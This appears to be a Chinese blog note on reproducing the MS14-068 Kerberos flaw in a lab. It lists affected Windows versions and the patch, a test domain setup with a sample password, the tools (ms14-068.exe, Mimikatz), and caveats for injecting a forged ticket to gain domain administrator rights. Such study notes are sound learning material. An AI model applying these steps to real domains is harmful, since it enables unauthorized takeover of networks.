MS14-068复现

这个漏洞在当时影响力还是挺大，虽然现在在内网中出现的次数可能很少了，但是对于我们后辈来说还是值得学习下的
如果哪天在内网中遇到了呢，也不慌至少有个笔记在，当时出这个漏洞的时候我还没有接触安全，所以来个笔记。

漏洞危害

这个漏洞的主要危害是以普通域用户身份可以伪造域管理员身份。
如果机器上并没有打补丁 3011780 则可能存在这个漏洞能够被恶意利用。
补丁查询方式

涉及系统：Windows Server 2003
Windows Vista
Windows Server 2008
Windows 7
Windows Server 2008 R2
Windows 8 and Windows 8.1
Windows Server 2012 and Windows Server 2012 R2
Server Core installation option

如果属于黑盒测试，并没有直接操作域控制器的权限，那么只能使用该漏洞，看是否能成功伪造域管理员登录来验证。

准备环境

域控制器: www.ms.com 地址10.10.10.1 系统: 2003
域普通用户: user 密码12345@qaz 地址 10.10.10.3 系统: 2012

准备工具

ms14-068.exe
Mimikatz2.0以上版本

票据注入

使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器

注意

  1. 注入票据时，机器不能是03或xp，因为mimikatz不支持这两个机器注入，听大佬说过有工具可以注入，希望有知道的朋友可以@me
  2. 当获取到域用户、域用户sid、密码以及可访问到域控制器的机器，并不需要机器一定在域中（如攻击者通过vpn等拨入内网），但需要把dns指向域控制器才能解析
  3. 访问域控制器时，需要使用主机名，不能使用ip
  4. 如有错误，请指正，万分感谢
